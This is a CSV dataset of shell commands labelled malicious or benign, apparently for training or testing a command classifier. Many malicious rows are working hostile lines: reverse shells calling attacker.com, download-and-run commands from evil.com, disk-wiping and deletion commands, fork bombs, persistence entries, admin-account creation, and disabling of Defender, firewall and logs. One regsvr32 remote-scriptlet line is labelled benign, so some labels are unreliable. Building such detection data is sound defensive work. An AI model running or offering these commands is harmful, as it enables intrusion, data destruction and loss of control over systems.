command,label
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
last 2>/dev/null,benign
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
sdelete -p 10 -s -z C:\ 2>&1,malicious
"(powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")')",malicious
format C: /q /x,malicious
which python -v,benign
wget http://malicious.com/malware.exe,malicious
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
nohup wevtutil cl Security,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
iptables -L > output.txt,benign
(mkfs.ext4 /dev/sda1),malicious
diskpart select disk 0 clean,malicious
curl -I https://google.com,benign
cat /dev/urandom > /dev/sda,malicious
whoami,benign
wevtutil cl System,malicious
(mshta javascript:alert('code execution')),malicious
echo 'Hello World',benign
cp file1.txt file2.txt,benign
ls -la 2>/dev/null,benign
ps aux,benign
java -version,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' 2>&1",malicious
net localgroup administrators hacker /add 2>&1,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
top,benign
certutil -hashfile file.txt SHA256,benign
service apache2 status | head -5,benign
ufw status 2>/dev/null,benign
attrib +h +s malware.exe,malicious
groups user,benign
nohup diskpart select disk 0 clean,malicious
kubectl get pods,benign
nohup :(){ :|:& };:,malicious
chmod 755 script.sh,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
:(){ :|:& };:,malicious
free -m | head -5,benign
cat /dev/urandom > /dev/sda,malicious
powershell Get-Process,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
cmd /c del /q /s C:\*,malicious
type ls 2>/dev/null,benign
uniq sorted.txt,benign
vmstat,benign
tar -czf backup.tar.gz /data,benign
cipher /w:C:\,malicious
tar -czf backup.tar.gz /data -v,benign
history,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
top,benign
top,benign
umount /dev/sdb1 | head -5,benign
sed 's/old/new/g' file.txt,benign
mkfs.ext4 /dev/sda1,malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
java -version,benign
ls -la,benign
timeout 60 sc stop Windows Defender,malicious
wget https://example.com/file.txt -v,benign
mshta javascript:alert('code execution'),malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
cmd /c del /q /s C:\* >/dev/null,malicious
sc stop Windows Defender,malicious
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
finger user -v,benign
iostat,benign
service apache2 status,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
rmdir empty_folder,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
"python -c 'import os; os.system(""rm -rf /"")' >/dev/null",malicious
curl -I https://google.com,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
docker images,benign
find /home -name '*.txt',benign
service apache2 status,benign
which python | head -5,benign
bash -i >& /dev/tcp/attacker.com/443 0>&1 &,malicious
kubectl get pods -v,benign
find /home -name '*.txt',benign
ps aux,benign
(ncat -lvp 443 -e cmd.exe),malicious
head -10 logfile.txt | head -5,benign
mkfs.ext4 /dev/sda1,malicious
uniq sorted.txt,benign
service apache2 status,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)'",malicious
wevtutil cl Security,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
taskkill /f /im antimalware.exe,malicious
chmod 755 script.sh,benign
nohup bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
wget https://example.com/file.txt,benign
taskkill /f /im antimalware.exe,malicious
mv old.txt new.txt,benign
htop 2>/dev/null,benign
sudo iptables -L,benign
scp file.txt user@server:/path/,benign
userdel olduser | head -5,benign
pip list,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
ping -c 4 google.com,benign
apt list --installed | head -5,benign
vmstat,benign
"ruby -rsocket -e'f=TCPSocket.open(""attacker.com"",443).to_i;exec sprintf(""/bin/sh -i <&%d >&%d 2>&%d"",f,f,f)' &",malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe 2>&1,malicious
df -h | head -5,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
sudo passwd user,benign
:(){ :|:& };:,malicious
mshta javascript:alert('code execution') >/dev/null,malicious
netstat -tulpn,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA=,malicious
sudo pip list,benign
w | head -5,benign
wget https://example.com/file.txt,benign
umount /dev/sdb1 -v,benign
rm -rf / &,malicious
wmic process call create 'cmd.exe /c powershell.exe' 2>&1,malicious
sudo head -10 logfile.txt,benign
curl http://evil.com/payload.sh | bash,malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");' 2>&1",malicious
sdelete -p 10 -s -z C:\,malicious
grep pattern file.txt,benign
uniq sorted.txt,benign
dd if=/dev/zero of=/dev/sda,malicious
w,benign
systemctl reload nginx | head -5,benign
wc -l document.txt | head -5,benign
iostat,benign
chmod 777 /etc/shadow,malicious
net user hacker password123 /add,malicious
useradd newuser,benign
"python -c 'import os; os.system(""rm -rf /"")' 2>&1",malicious
attrib +h +s malware.exe,malicious
echo 'Hello World',benign
whoami,benign
iostat,benign
:(){ :|:& };:,malicious
ps aux,benign
mkfs.ext4 /dev/sda1,malicious
mshta javascript:alert('code execution'),malicious
docker images,benign
mkfs.ext4 /dev/sda1,malicious
finger user,benign
traceroute google.com | head -5,benign
nohup shutdown /r /f /t 0,malicious
npm list,benign
finger user,benign
mshta javascript:alert('code execution'),malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
git clone https://github.com/user/repo.git,benign
htop --help,benign
net user hacker password123 /add,malicious
ps aux,benign
whoami --help,benign
curl -I https://google.com,benign
tail -f /var/log/syslog,benign
format C: /q /x,malicious
history -v,benign
vssadmin delete shadows /all /quiet &,malicious
du -sh /var/log -v,benign
timeout 60 reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
attrib +h +s malware.exe,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
nohup reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
touch newfile.txt,benign
iptables -L --help,benign
ufw status -v,benign
(schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon),malicious
echo 'Hello World',benign
which python,benign
pwd,benign
usermod -aG sudo user,benign
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
(certutil -urlcache -split -f http://evil.com/malware.exe malware.exe),malicious
iptables -L,benign
netsh advfirewall set allprofiles state off,malicious
python --version,benign
timeout 60 format C: /q /x,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
nslookup google.com,benign
(wevtutil cl System),malicious
shutdown /r /f /t 0,malicious
chown user:group file.txt,benign
npm list -v,benign
(reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe),malicious
shutdown /r /f /t 0,malicious
(shutdown /r /f /t 0),malicious
msbuild project.csproj,benign
cat /dev/urandom > /dev/sda,malicious
nohup net user hacker password123 /add,malicious
curl http://evil.com/payload.sh | bash >/dev/null,malicious
timeout 60 rm -rf /,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ >/dev/null,malicious
vmstat -v,benign
wevtutil cl Security,malicious
usermod -aG sudo user -v,benign
shutdown /r /f /t 0,malicious
net user hacker password123 /add,malicious
mshta javascript:alert('code execution') 2>&1,malicious
umount /dev/sdb1,benign
chmod 777 /etc/shadow,malicious
lsblk,benign
sdelete -p 10 -s -z C:\,malicious
cmd /c del /q /s C:\*,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>&1,malicious
npm list,benign
du -sh /var/log 2>/dev/null,benign
powershell -enc ZQBjAGgAbwAgAGgAZQBsAGwAbwA= >/dev/null,malicious
schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon &,malicious
ls -la,benign
iostat,benign
groups user,benign
certutil -urlcache -split -f http://evil.com/malware.exe malware.exe,malicious
netsh advfirewall set allprofiles state off,malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
which python,benign
net user hacker password123 /add,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
ps aux 2>/dev/null,benign
wevtutil cl Security >/dev/null,malicious
bcdedit /set {default} bootstatuspolicy ignoreallfailures,malicious
echo 'virus' > /etc/passwd,malicious
net localgroup administrators hacker /add >/dev/null,malicious
chown user:group file.txt,benign
taskkill /f /im antimalware.exe,malicious
iostat,benign
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
wevtutil cl System,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
mkdir -p /tmp/test,benign
iostat,benign
nohup regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
vssadmin delete shadows /all /quiet,malicious
awk '{print $1}' data.txt 2>/dev/null,benign
rsync -av /src/ /dst/,benign
(bash -i >& /dev/tcp/attacker.com/443 0>&1),malicious
(regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll),malicious
cp file1.txt file2.txt > output.txt,benign
netstat -tulpn,benign
cmd /c del /q /s C:\*,malicious
(copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\),malicious
systemctl reload nginx -v,benign
echo 'Hello World',benign
rmdir empty_folder,benign
format C: /q /x,malicious
net localgroup administrators hacker /add &,malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
mshta javascript:alert('code execution'),malicious
umount /dev/sdb1,benign
ncat -lvp 443 -e cmd.exe,malicious
format C: /q /x,malicious
fdisk -l,benign
chmod 777 /etc/shadow,malicious
msbuild project.csproj,benign
(:(){ :|:& };:),malicious
ls -la,benign
timeout 60 ncat -lvp 443 -e cmd.exe,malicious
(shutdown /r /f /t 0),malicious
regsvr32 /s /n /u /i:https://www.example.org/file.sct scrobj.dll,benign
mkfs.ext4 /dev/sda1,malicious
ssh user@server.com,benign
id user,benign
kubectl get pods,benign
curl -I https://google.com,benign
ssh user@server.com,benign
mount,benign
mkfs.ext4 /dev/sda1,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
"socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash",malicious
free -m,benign
mshta javascript:alert('code execution'),malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\ 2>&1,malicious
tar -czf backup.tar.gz /data,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
bash -i >& /dev/tcp/attacker.com/443 0>&1,malicious
python --version,benign
last > output.txt,benign
uniq sorted.txt 2>/dev/null,benign
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
netstat -tulpn -v,benign
apt list --installed,benign
"powershell -windowstyle hidden -ep bypass -c 'iex(New-Object Net.WebClient).DownloadString(""http://evil.com/payload.ps1"")'",malicious
shutdown /r /f /t 0 2>&1,malicious
echo 'virus' > /etc/passwd,malicious
rm -rf /,malicious
dd if=/dev/zero of=/dev/sda &,malicious
sudo man ls,benign
cat /dev/urandom > /dev/sda,malicious
nc -l -p 4444 -e /bin/bash,malicious
sudo chown user:group file.txt,benign
(:(){ :|:& };:),malicious
curl http://evil.com/payload.sh | bash,malicious
chown user:group file.txt,benign
java -version,benign
sudo certutil -hashfile file.txt SHA256,benign
ss -tulpn,benign
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe 2>&1,malicious
attrib +h +s malware.exe,malicious
free -m,benign
timeout 60 curl http://evil.com/payload.sh | bash,malicious
df -h,benign
net localgroup administrators hacker /add,malicious
cp file1.txt file2.txt,benign
sudo docker ps,benign
git clone https://github.com/user/repo.git,benign
vssadmin delete shadows /all /quiet,malicious
wevtutil cl System,malicious
uniq sorted.txt -v,benign
mshta javascript:alert('code execution'),malicious
nslookup google.com --help,benign
yum list installed,benign
echo 'virus' > /etc/passwd,malicious
man ls > output.txt,benign
netsh advfirewall set allprofiles state off >/dev/null,malicious
regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll,malicious
awk '{print $1}' data.txt 2>/dev/null,benign
sc stop Windows Defender,malicious
umount /dev/sdb1,benign
timeout 60 mkfs.ext4 /dev/sda1,malicious
history 2>/dev/null,benign
find /home -name '*.txt',benign
csc -target:library file.cs,benign
sudo node --version,benign
find /home -name '*.txt',benign
(cat /dev/urandom > /dev/sda),malicious
cmd /c echo malicious > C:\Windows\System32\drivers\etc\hosts,malicious
last -v,benign
nohup copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
sudo umount /dev/sdb1,benign
ss -tulpn 2>/dev/null,benign
"python -c 'import os; os.system(""rm -rf /"")' &",malicious
bitsadmin /transfer myDownload http://evil.com/payload.exe C:\payload.exe,malicious
traceroute google.com,benign
service apache2 status,benign
shutdown /r /f /t 0 &,malicious
chown user:group file.txt 2>/dev/null,benign
ssh user@server.com,benign
iptables -L 2>/dev/null,benign
"rundll32 javascript:'\..\mshtml,RunHTMLApplication ';alert('XSS')",malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
timeout 60 netsh advfirewall set allprofiles state off,malicious
java -version > output.txt,benign
attrib +h +s malware.exe,malicious
touch newfile.txt,benign
df -h,benign
rmdir empty_folder,benign
wevtutil cl Security,malicious
wget http://malicious.com/malware.exe,malicious
certutil -hashfile file.txt SHA256 --help,benign
systemctl reload nginx -v,benign
df -h,benign
wget http://malicious.com/malware.exe,malicious
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
wevtutil cl Security,malicious
net user hacker password123 /add,malicious
chown user:group file.txt,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
copy malware.exe %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\,malicious
mshta javascript:alert('code execution'),malicious
wevtutil cl Security 2>&1,malicious
who | head -5,benign
"python -c 'import os; os.system(""rm -rf /"")'",malicious
wevtutil cl Security,malicious
uniq sorted.txt | head -5,benign
cmd /c del /q /s C:\*,malicious
"python -c 'import os; os.system(""rm -rf /"")'",malicious
id user,benign
wmic process call create 'cmd.exe /c powershell.exe',malicious
chmod 777 /etc/shadow,malicious
net localgroup administrators hacker /add,malicious
attrib +h +s malware.exe,malicious
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v malware /d C:\malware.exe,malicious
git clone https://github.com/user/repo.git,benign
fdisk -l,benign
mkdir -p /tmp/test,benign
history,benign
rm -rf /,malicious
netsh advfirewall set allprofiles state off,malicious
curl http://evil.com/payload.sh | bash,malicious
git clone https://github.com/user/repo.git,benign
nslookup google.com,benign
date,benign
touch newfile.txt,benign
"perl -e 'use Socket;$i=""attacker.com"";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,"">&S"");open(STDOUT,"">&S"");open(STDERR,"">&S"");exec(""/bin/sh -i"");'",malicious
cipher /w:C:\,malicious
timeout 60 schtasks /create /tn 'evil' /tr 'C:\malware.exe' /sc onlogon,malicious
crontab -l,benign
attrib +h +s malware.exe 2>&1,malicious
